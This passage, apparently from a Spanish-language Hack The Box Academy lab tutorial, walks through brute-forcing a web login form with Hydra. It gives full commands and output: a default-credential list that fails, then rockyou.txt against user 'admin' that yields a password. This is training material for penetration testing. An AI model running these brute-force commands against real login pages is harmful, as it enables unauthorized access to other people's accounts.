En nuestra situación, no tenemos información sobre los nombres de usuario o contraseñas existentes. Dado que enumeramos todos los puertos disponibles y no pudimos determinar ninguna información útil, tenemos la opción de probar el formulario de la aplicación web para credenciales predeterminadas en combinación con el módulo `http-post-form`.

---

## Default Credentials

Vamos a intentar usar la lista `ftp-betterdefaultpasslist.txt` con las credenciales predeterminadas para probar si una de las cuentas está registrada en la aplicación web.

```r
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

Como podemos ver, no pudimos identificar ninguna credencial funcional. Sin embargo, esto solo tomó unos segundos y descartamos el uso de contraseñas predeterminadas. Ahora, podemos pasar a usar una wordlist de contraseñas.

---

## Password Wordlist

Dado que el ataque de fuerza bruta falló utilizando credenciales predeterminadas, podemos intentar realizar un brute force en el formulario de la aplicación web con un usuario especificado. A menudo se utilizan nombres de usuario como `admin`, `administrator`, `wpadmin`, `root`, `adm` y similares en paneles de administración y rara vez se cambian. Conociendo este hecho, podemos limitar el número de posibles nombres de usuario. El nombre de usuario más común que usan los administradores es `admin`. En este caso, especificamos este nombre de usuario para nuestro próximo intento de acceder al panel de administración.

```r
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'

[PORT][http-post-form] host: 178.35.49.134   login: admin   password: password123
[STATUS] attack finished for 178.35.49.134 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

Podemos intentar iniciar sesión con estas credenciales ahora:

`http://178.35.49.134:32901/login.php`

![](https://academy.hackthebox.com/storage/modules/57/bruteforcing_logged_in_1.jpg)